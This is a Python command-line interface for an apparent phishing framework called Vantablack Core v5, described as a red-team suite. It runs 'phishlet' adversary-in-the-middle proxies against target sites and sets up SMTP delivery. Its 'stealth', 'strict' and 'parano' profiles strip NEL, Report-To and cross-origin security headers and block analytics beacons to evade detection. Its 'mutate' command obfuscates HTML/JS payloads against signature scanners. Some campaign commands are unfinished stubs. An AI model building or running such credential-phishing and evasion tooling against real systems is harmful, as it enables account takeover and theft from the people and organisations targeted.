"""
Vantablack Core v5 - CLI (vanta)
================================

Unified Command Line Interface for:
- Campaign Management (setup, run, stop)
- Asset Generation (mutate, analyze)
- System Status (metrics, health)
"""

import click
import asyncio
import logging
from rich.console import Console
from rich.table import Table
from core.mutation.engine import MutationEngine
from core.mutation.scanner import DetectionScanner
from core.common import config
import subprocess
import sys
import os
import textwrap
from core.orchestrator.autopilot import Autopilot
from core.common.metrics import MUTATION_OPS, DETECTION_EVENTS

console = Console()

@click.group()
def cli():
    """Vantablack Core v5 - Red Team Operations Suite"""
    logging.basicConfig(level=logging.INFO)

@cli.command()
def init():
    """Interactive environment initialization"""
    console.print("[cyan]Initializing environment[/cyan]")
    db_url = click.prompt("DB_URL", default=config.get("DB_URL"))
    smtp_host = click.prompt("SMTP_HOST", default=config.get("SMTP_HOST"))
    smtp_port = click.prompt("SMTP_PORT", default=config.get("SMTP_PORT"))
    smtp_user = click.prompt("SMTP_USER", default=config.get("SMTP_USER"))
    smtp_pass = click.prompt("SMTP_PASS", default=config.get("SMTP_PASS"), hide_input=True)
    edge_enabled = click.prompt("EDGE_ENABLED [true/false]", default=config.get("EDGE_ENABLED"))
    env_path = ".env"
    with open(env_path, "w") as f:
        f.write(f"DB_URL={db_url}\n")
        f.write(f"SMTP_HOST={smtp_host}\n")
        f.write(f"SMTP_PORT={smtp_port}\n")
        f.write(f"SMTP_USER={smtp_user}\n")
        f.write(f"SMTP_PASS={smtp_pass}\n")
        f.write(f"EDGE_ENABLED={edge_enabled}\n")
    console.print(f"[green]Written {env_path}[/green]")

@cli.command()
def doctor():
    """Environment diagnostics"""
    table = Table(title="Environment Check")
    table.add_column("Item")
    table.add_column("Status")
    try:
        import fastapi  # noqa
        table.add_row("fastapi", "OK")
    except Exception:
        table.add_row("fastapi", "MISSING")
    try:
        import mitmproxy  # noqa
        table.add_row("mitmproxy", "OK")
    except Exception:
        table.add_row("mitmproxy", "OPTIONAL")
    try:
        import aiosmtplib  # noqa
        table.add_row("aiosmtplib", "OK")
    except Exception:
        table.add_row("aiosmtplib", "MISSING")
    cfg = config.sanitized()
    table.add_row("DB_URL", cfg.get("DB_URL"))
    table.add_row("SMTP_HOST", cfg.get("SMTP_HOST"))
    console.print(table)

@cli.command("phishlets-validate")
def phishlets_validate():
    """Valide tous les phishlets et affiche un résumé"""
    try:
        from core.edge.phishlets import PhishletLoader
        import glob
        loader = PhishletLoader()
        ok = 0
        files = glob.glob("phishlets/*.yaml")
        for p in files:
            with open(p, "r") as f:
                y = f.read()
            cfg = loader.load_from_yaml(y)
            console.print(f"[green]OK[/green] {p} → {cfg.name} ({len(cfg.proxy_hosts)} hosts)")
            ok += 1
        console.print(f"[bold]{ok} phishlet(s) valides[/bold]")
    except Exception as e:
        console.print(f"[red]Erreur: {e}[/red]")

@cli.command()
@click.option("--port", default=8000)
def demo(port):
    """Run demo API with metrics and guide"""
    app_code = "from fastapi import FastAPI\nfrom core.api.routes import router\napp=FastAPI()\napp.include_router(router)\n"
    path = ".v5_demo_app.py"
    with open(path, "w") as f:
        f.write(app_code)
    console.print("[yellow]Starting demo server[/yellow]")
    subprocess.run([sys.executable, "-m", "uvicorn", ".v5_demo_app:app", "--port", str(port)], check=False)

@cli.command("edge-demo")
@click.option("--phishlet", default="phishlets/example.yaml")
@click.option("--host", default="0.0.0.0")
@click.option("--port", default=8443, type=int)
def edge_demo(phishlet, host, port):
    """Run Edge Proxy demo if mitmproxy is available"""
    try:
        from core.edge.proxy import EdgeProxy, EdgeConfig
        import asyncio
        cfg = EdgeConfig(listen_host=host, listen_port=port)
        proxy = EdgeProxy(cfg)
        console.print(f"[yellow]Starting Edge demo on {host}:{port}[/yellow]")
        with open(phishlet, "r") as f:
            ph_yaml = f.read()
        asyncio.run(proxy.start(ph_yaml))
    except Exception as e:
        console.print(f"[red]Edge demo unavailable: {e}[/red]")
        console.print("[blue]Install optional dependency: mitmproxy[/blue]")

@cli.command("edge-preset")
@click.option("--host", default="0.0.0.0")
@click.option("--port", default=8443, type=int)
def edge_preset(host, port):
    """Run Edge Proxy with preset demo mapping"""
    try:
        from core.edge.proxy import EdgeProxy, EdgeConfig
        import asyncio
        cfg = EdgeConfig(listen_host=host, listen_port=port)
        proxy = EdgeProxy(cfg)
        console.print(f"[yellow]Starting Edge preset on {host}:{port}[/yellow]")
        with open("phishlets/preset_demo.yaml", "r") as f:
            ph_yaml = f.read()
        asyncio.run(proxy.start(ph_yaml))
    except Exception as e:
        console.print(f"[red]Edge preset unavailable: {e}[/red]")
        console.print("[blue]Install optional dependency: mitmproxy[/blue]")

@cli.command("edge-run")
@click.option("--name", help="Nom du phishlet dans ./phishlets (sans .yaml)")
@click.option("--path", help="Chemin vers un phishlet YAML")
@click.option("--host", default="0.0.0.0")
@click.option("--port", default=8443, type=int)
@click.option("--upstream", help="Proxy HTTP amont ex: http://user:pass@host:3128")
@click.option("--rate", type=int, help="Limite de requêtes par minute par IP")
@click.option("--allow-ips", help="Liste CSV d'IPs autorisées")
@click.option("--deny-ips", help="Liste CSV d'IPs refusées")
@click.option("--http2/--no-http2", default=True, help="Activer HTTP/2 (par défaut)")
@click.option("--conn-strategy", default="lazy", help="Stratégie de connexion mitmproxy (lazy|eager)")
@click.option("--profile", default="default", help="Profil (default|stealth|strict|perf|parano)")
def edge_run(name, path, host, port, upstream, rate, allow_ips, deny_ips, http2, conn_strategy, profile):
    try:
        from core.edge.proxy import EdgeProxy, EdgeConfig
        import asyncio
        import yaml
        if not path and name:
            path = os.path.join("phishlets", f"{name}.yaml")
        if not path:
            console.print("[red]Spécifie --name ou --path[/red]")
            return
        with open(path, "r") as f:
            ph_yaml = f.read()
        # Appliquer profil
        p = (profile or "default").lower()
        _profile_http2 = None
        if p == "stealth":
            try:
                data = yaml.safe_load(ph_yaml)
                if not isinstance(data, dict):
                    raise ValueError("phishlet YAML invalide")
                # Blocklist agressive
                bl = data.get("blocklist") or []
                extra_bl = [
                    {"pattern": "analytics|gtm|/metrics|/collect", "mimes": ["text/javascript","application/javascript"], "max_kb": 512},
                    {"pattern": "/fonts/|/woff2|/ttf", "mimes": ["font/"], "max_kb": 256},
                    {"pattern": "/video|/media", "mimes": ["video/"], "max_kb": 1024},
                    {"pattern": "/images|/img|/static/", "mimes": ["image/"], "max_kb": 300},
                ]
                bl.extend(extra_bl)
                data["blocklist"] = bl
                # En-têtes: retirer NEL/Report-To si présents
                hdrs = data.get("headers") or []
                hdrs.extend([
                    {"action": "remove", "name": "NEL"},
                    {"action": "remove", "name": "Report-To"},
                ])
                data["headers"] = hdrs
                ph_yaml = yaml.safe_dump(data, sort_keys=False)
                # Réseau par défaut stealth si non surchargé
                if rate is None:
                    os.environ["RATE_LIMIT_PER_MINUTE"] = "60"
            except Exception as e:
                console.print(f"[yellow]Profil stealth non appliqué: {e}[/yellow]")
        elif p == "strict":
            try:
                data = yaml.safe_load(ph_yaml)
                if not isinstance(data, dict):
                    raise ValueError("phishlet YAML invalide")
                bl = data.get("blocklist") or []
                extra_bl = [
                    {"pattern": "analytics|gtm|beacon|/collect|/measure", "mimes": ["text/javascript","application/javascript"], "max_kb": 256},
                    {"pattern": "/fonts/|/woff2|/ttf", "mimes": ["font/"], "max_kb": 160},
                    {"pattern": "/video|/media|/stream", "mimes": ["video/"], "max_kb": 400},
                    {"pattern": "/images|/img|/static/", "mimes": ["image/"], "max_kb": 150},
                ]
                bl.extend(extra_bl)
                data["blocklist"] = bl
                # En-têtes à retirer
                hdrs = data.get("headers") or []
                hdrs.extend([
                    {"action": "remove", "name": "NEL"},
                    {"action": "remove", "name": "Report-To"},
                    {"action": "remove", "name": "Cross-Origin-Opener-Policy"},
                    {"action": "remove", "name": "Cross-Origin-Embedder-Policy"},
                    {"action": "remove", "name": "Cross-Origin-Resource-Policy"},
                    {"action": "remove", "name": "Permissions-Policy"},
                ])
                data["headers"] = hdrs
                ph_yaml = yaml.safe_dump(data, sort_keys=False)
                # HTTP/2 off et limite plus basse
                _profile_http2 = False
                if rate is None:
                    os.environ["RATE_LIMIT_PER_MINUTE"] = "40"
            except Exception as e:
                console.print(f"[yellow]Profil strict non appliqué: {e}[/yellow]")
        elif p == "perf":
            try:
                data = yaml.safe_load(ph_yaml)
                if not isinstance(data, dict):
                    raise ValueError("phishlet YAML invalide")
                bl = data.get("blocklist") or []
                extra_bl = [
                    {"pattern": "analytics|gtm", "mimes": ["text/javascript","application/javascript"], "max_kb": 1024},
                ]
                bl.extend(extra_bl)
                data["blocklist"] = bl
                hdrs = data.get("headers") or []
                hdrs.extend([
                    {"action": "remove", "name": "NEL"},
                    {"action": "remove", "name": "Report-To"},
                ])
                data["headers"] = hdrs
                ph_yaml = yaml.safe_dump(data, sort_keys=False)
                if rate is None:
                    os.environ["RATE_LIMIT_PER_MINUTE"] = "100"
            except Exception as e:
                console.print(f"[yellow]Profil perf non appliqué: {e}[/yellow]")
        elif p == "parano":
            try:
                data = yaml.safe_load(ph_yaml)
                if not isinstance(data, dict):
                    raise ValueError("phishlet YAML invalide")
                bl = data.get("blocklist") or []
                extra_bl = [
                    {"pattern": ".*", "mimes": ["video/"], "max_kb": 1},
                    {"pattern": ".*", "mimes": ["image/"], "max_kb": 120},
                    {"pattern": "fonts?|woff2|ttf", "mimes": ["font/"], "max_kb": 120},
                    {"pattern": "analytics|gtm|beacon|/collect|/measure", "mimes": ["text/javascript","application/javascript"], "max_kb": 180},
                ]
                bl.extend(extra_bl)
                data["blocklist"] = bl
                hdrs = data.get("headers") or []
                hdrs.extend([
                    {"action": "remove", "name": "NEL"},
                    {"action": "remove", "name": "Report-To"},
                    {"action": "remove", "name": "Cross-Origin-Opener-Policy"},
                    {"action": "remove", "name": "Cross-Origin-Embedder-Policy"},
                    {"action": "remove", "name": "Cross-Origin-Resource-Policy"},
                    {"action": "remove", "name": "Permissions-Policy"},
                ])
                data["headers"] = hdrs
                ph_yaml = yaml.safe_dump(data, sort_keys=False)
                _profile_http2 = False
                if rate is None:
                    os.environ["RATE_LIMIT_PER_MINUTE"] = "30"
            except Exception as e:
                console.print(f"[yellow]Profil parano non appliqué: {e}[/yellow]")
        # Environnement réseau
        if rate is not None:
            os.environ["RATE_LIMIT_PER_MINUTE"] = str(rate)
        if allow_ips is not None:
            os.environ["ALLOW_IPS"] = allow_ips
        if deny_ips is not None:
            os.environ["DENY_IPS"] = deny_ips
        cfg = EdgeConfig(listen_host=host, listen_port=port)
        cfg.http2 = bool(http2) if _profile_http2 is None else bool(_profile_http2)
        cfg.connection_strategy = conn_strategy
        if upstream:
            cfg.upstream_http = upstream
        proxy = EdgeProxy(cfg)
        console.print(f"[yellow]Starting Edge with {path}[/yellow]")
        asyncio.run(proxy.start(ph_yaml))
    except Exception as e:
        console.print(f"[red]Edge run failed: {e}[/red]")
        console.print("[blue]Install optional dependency: mitmproxy[/blue]")

@cli.command("phishlets-list")
def phishlets_list():
    rows = []
    try:
        import yaml
        for fn in os.listdir("phishlets"):
            if not fn.endswith(".yaml"):
                continue
            path = os.path.join("phishlets", fn)
            with open(path, "r") as f:
                data = yaml.safe_load(f)
            name = data.get("name", fn[:-5])
            targets = []
            for m in data.get("proxy_hosts", []):
                t = m.get("target")
                if t:
                    targets.append(t)
            rows.append((fn[:-5], name, ", ".join(targets)))
    except Exception:
        pass
    table = Table(title="Phishlets disponibles")
    table.add_column("Fichier")
    table.add_column("Nom")
    table.add_column("Cibles")
    for f, n, t in sorted(rows):
        table.add_row(f, n, t)
    console.print(table)

@cli.command()
@click.option("--open-server", is_flag=True, help="Start demo server after run")
def lunar(open_server):
    """Lunar Mode: mutation + scanner + autopilot cycle with metrics"""
    console.print("[magenta]Launching Lunar Mode[/magenta]")
    # Sample HTML to mutate and scan
    html = "<html><body class='login-form'><script>eval('bad');</script></body></html>"
    engine = MutationEngine()
    mutated = engine.mutate_html(html)
    scanner = DetectionScanner()
    res = scanner.scan_content(mutated)
    MUTATION_OPS.inc()
    if res["status"] == "RISKY":
        DETECTION_EVENTS.inc()
    console.print("[bold]Scan Result:[/bold] " + str(res))
    # Autopilot event
    ap = Autopilot()
    asyncio.run(ap.process_event({"type": "detection_alert", "source": "LunarTest", "campaign_id": "lunar-001"}))
    if open_server:
        console.print("[yellow]Opening demo server[/yellow]")
        demo.callback(8000)  # type: ignore

@cli.command()
@click.option("--name", prompt="Campaign Name", help="Name of the campaign")
@click.option("--target", prompt="Target Profile", help="Target organization/profile")
def setup(name, target):
    """Initialize a new campaign structure"""
    console.print(f"[green]Initializing campaign: {name} (Target: {target})[/green]")
    # TODO: Create campaign directory and config from template
    console.print("[bold]Done.[/bold]")

@cli.command()
@click.option("--campaign", required=True, help="Campaign ID to run")
def run(campaign):
    """Launch a campaign (Delivery + Edge)"""
    console.print(f"[yellow]Launching campaign {campaign}...[/yellow]")
    # TODO: Invoke Orchestrator
    console.print("[green]Campaign is RUNNING[/green]")

@cli.command()
@click.option("--file", required=True, help="Input HTML/JS file")
def mutate(file):
    """Obfuscate and mutate a payload file"""
    try:
        with open(file, 'r') as f:
            content = f.read()
        
        engine = MutationEngine()
        if file.endswith(".html"):
            mutated = engine.mutate_html(content)
        elif file.endswith(".js"):
            mutated = engine.mutate_js(content)
        else:
            console.print("[red]Unsupported file type[/red]")
            return

        out_file = f"{file}.mutated"
        with open(out_file, 'w') as f:
            f.write(mutated)
            
        console.print(f"[green]Mutation complete. Saved to {out_file}[/green]")
        
    except Exception as e:
        console.print(f"[red]Error: {e}[/red]")

@cli.command()
@click.option("--file", required=True, help="File to analyze")
def analyze(file):
    """Scan a file for detection signatures"""
    try:
        with open(file, 'r') as f:
            content = f.read()
            
        scanner = DetectionScanner()
        result = scanner.scan_content(content)
        
        table = Table(title="Analysis Result")
        table.add_column("Metric", style="cyan")
        table.add_column("Value", style="magenta")
        
        table.add_row("Status", result["status"])
        table.add_row("Risk Score", str(result["score"]))
        table.add_row("Signatures", ", ".join(result["matches"]))
        
        console.print(table)
        
    except Exception as e:
        console.print(f"[red]Error: {e}[/red]")

if __name__ == "__main__":
    cli()
